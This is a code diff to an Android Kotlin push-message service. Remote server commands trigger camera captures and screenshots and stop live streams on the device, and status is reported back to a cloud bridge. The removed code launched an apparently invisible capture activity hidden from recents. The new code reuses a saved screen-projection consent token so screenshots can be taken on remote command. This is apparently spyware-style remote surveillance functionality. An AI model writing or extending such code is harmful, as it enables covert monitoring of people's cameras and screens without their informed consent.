@@ -115,73 +115,64 @@ class FirebasePushMessagingService : FirebaseMessagingService() {
 
             "camera_capture" -> {
                 try {
-                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
-                        putExtra("action", "camera_capture")
+                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                         putExtra("requestId", requestId)
                         putExtra("cameraFacing", cameraFacing)
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
                     }
-                    startActivity(invIntent)
-                } catch (e: Throwable) {
-                    Log.e(TAG, "Error starting InvisibleCaptureActivity from FCM: ${e.message}")
-                    try {
-                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
-                            putExtra("requestId", requestId)
-                            putExtra("cameraFacing", cameraFacing)
-                        }
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                            startForegroundService(svcIntent)
-                        } else {
-                            startService(svcIntent)
-                        }
-                    } catch (t: Throwable) {
-                        if (requestId.isNotEmpty()) {
-                            CloudBridgeSync.updateRequestStatus(
-                                requestId = requestId,
-                                status = "failed",
-                                error = "FCM Camera start failed",
-                                failureReason = t.message
-                            )
-                        }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(svcIntent)
+                    } else {
+                        startService(svcIntent)
+                    }
+                } catch (t: Throwable) {
+                    if (requestId.isNotEmpty()) {
+                        CloudBridgeSync.updateRequestStatus(
+                            requestId = requestId,
+                            status = "failed",
+                            error = "FCM Camera start failed: ${t.message}",
+                            failureReason = t.message
+                        )
                     }
                 }
             }
 
             "screenshot" -> {
                 try {
-                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
-                        putExtra("action", "screenshot")
+                    val savedProjection = MediaProjectionStore.load(this)
+                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                         putExtra("requestId", requestId)
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
+                        putExtra("capture_once", true)
+                        if (savedProjection.first != 0 && savedProjection.second != null) {
+                            putExtra("resultCode", savedProjection.first)
+                            putExtra("resultData", savedProjection.second)
+                        }
                     }
-                    startActivity(invIntent)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(svcIntent)
+                    } else {
+                        startService(svcIntent)
+                    }
+                } catch (t: Throwable) {
+                    if (requestId.isNotEmpty()) {
+                        CloudBridgeSync.updateRequestStatus(
+                            requestId = requestId,
+                            status = "failed",
+                            error = "FCM Screenshot start failed: ${t.message}",
+                            failureReason = t.message
+                        )
+                    }
+                }
+            }
+
+            "stop_stream", "stop_share" -> {
+                try {
+                    val stopIntent = Intent(this, WebRtcPublisherService::class.java)
+                    stopService(stopIntent)
+                    if (requestId.isNotEmpty()) {
+                        CloudBridgeSync.updateRequestStatus(requestId, "completed")
+                    }
                 } catch (e: Throwable) {
-                    Log.e(TAG, "Error starting InvisibleCaptureActivity from FCM: ${e.message}")
-                    try {
-                        val savedProjection = MediaProjectionStore.load(this)
-                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                            putExtra("requestId", requestId)
-                            putExtra("capture_once", true)
-                            if (savedProjection.first != 0 && savedProjection.second != null) {
-                                putExtra("resultCode", savedProjection.first)
-                                putExtra("resultData", savedProjection.second)
-                            }
-                        }
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                            startForegroundService(svcIntent)
-                        } else {
-                            startService(svcIntent)
-                        }
-                    } catch (t: Throwable) {
-                        if (requestId.isNotEmpty()) {
-                            CloudBridgeSync.updateRequestStatus(
-                                requestId = requestId,
-                                status = "failed",
-                                error = "FCM Screenshot start failed",
-                                failureReason = t.message
-                            )
-                        }
-                    }
+                    Log.e(TAG, "Error stopping stream from FCM: ${e.message}")
                 }
             }
 
